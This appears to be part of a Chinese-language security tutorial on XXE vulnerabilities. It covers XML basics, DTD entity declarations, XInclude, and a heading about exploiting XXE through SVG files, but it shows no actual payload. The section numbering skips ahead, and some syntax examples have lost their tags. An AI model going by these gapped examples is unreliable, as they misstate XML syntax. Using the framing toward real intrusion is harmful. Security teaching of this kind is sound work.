0x00.基础知识

1. XIMIL是一种标记语言
XML指可扩展标记语言(EXtensible Markup Language)把数据结构化后传输给对方让对方在结构化的数据中进行读取。

假设你要告诉同事“张三的座机是010-8888，手机是1380000，邮箱是zhang@xx.com”。

  • 非结构化（纯文本）：你发微信：“张三电话010-8888，手机1380000，邮箱zhang@xx.com”。
    如果同事的电脑要提取“手机号”，得写复杂的模糊匹配（万一张三写了“Tel”或者“Mobile”呢？）。

2. 标签没有被预定义，需要自行定义

这是XML与它的“表哥”HTML最本质的区别：

  • HTML（预定义标签）：浏览器只认识 [h1]（大标题）、[p]（段落）、[table]（表格）。标签是写死的，你不能自己发明一个 <帅哥> 标签让浏览器渲染，因为它不认识。
  • XML（自定义标签）：XML没有任何现成的标签库。它相当于给你一张白纸，完全由你（发送方和接收方）商量着来。比如，你们俩约定好用 <员工工号> 来传工号，用 <紧急联系人> 传亲属电话。只要双方都认这个“自定义名字”，数据就能正确读取。

3. 没有任何行为的 XML 的漏洞何处来？

绝大多数（超过95%）的XXE漏洞，核心根源就是利用了DTD声明中的“实体（ENTITY）声明”功能。

DTD声明规定：这个 XML 文档里可以出现哪些标签、标签之间的层级关系、标签里能填什么类型的数据，以及可以提前定义哪些“快捷方式（实体）

  • 内部DTD：DTD 代码直接写在 XML 文件内部的 <!DOCTYPE> 标签的方括号 [] 中。这种方式仅对该 XML 文件有效
  • 外部DTD：DTD 代码存放在一个独立的 .dtd 外部文件中，XML 通过 SYSTEM（私有）或 PUBLIC（公共）引用该文件。这种方式可以实现多个 XML 文件共用同一个 DTD 规范。

4. xml语法规则

1. 必须且只能有一个根元素

XML 文档的最外层必须且只能有一个父标签，所有其他标签都必须嵌套在它里面。

2. 标签必须成对且正确嵌套
有开始标签就必须有结束标签（或自闭合），且交叉嵌套是绝对禁止的。

3. 标签严格区分大小写
XML 是大小写敏感的，、 和 是三个完全不同的标签。

4. 属性值必须用引号引起来
标签的属性值必须用双引号 “ 或单引号 ‘ 包住，不能裸奔。

5. 特殊字符必须用实体引用替换
在文本内容中，< 和 & 是保留字符，不能直接写，必须换成预定义的实体。

6. 注释不能嵌套
注释的格式是 ，但注释内容里面不能再出现 –。

0x08.Xinclude

XML 的 XInclude 机制与 PHP 的 include、Python/Java 的 import 类似，本质上都是一种 文件包含 机制。其核心作用在于：将通用组件（如函数定义、配置片段）抽取为独立文件，在需要时动态引入。

  • 避免冗余：无需在每个文件中重复编写相同代码；
  • 提升可维护性：修改公共逻辑时只需更新一处；
  • 增强可读性：主文件结构更清晰，只保留核心逻辑。

例如，PHP 中可将功能函数集中放在 function.php，再通过 include 引入使用；XML 中则可使用 xi:include 引用外部文档片段，实现模块化组合

0x09.使用SVG进行XXE漏洞利用

SVG文件：可缩放矢量图形(Scalable Vector Graphics,SVG)基于XML 标记语言，用于描述二维的矢量图形。

作为一个基于文本的开放网络标准，SVG能够优雅而简洁地渲染不同大小的图形，并和CSS、DOM、JavaScript和 SMIL等其他网络标准无缝衔接。本质上，SVG相对于图像，就好比HTML相对于文本。

SVG图像及其相关行为被定义于XML文本文件之中，这意味着可以对它们进行搜索、索引、编写脚本以及压缩。此外，这也意味着可以使用任何文本编辑器和绘图软件来创建和编辑它们。
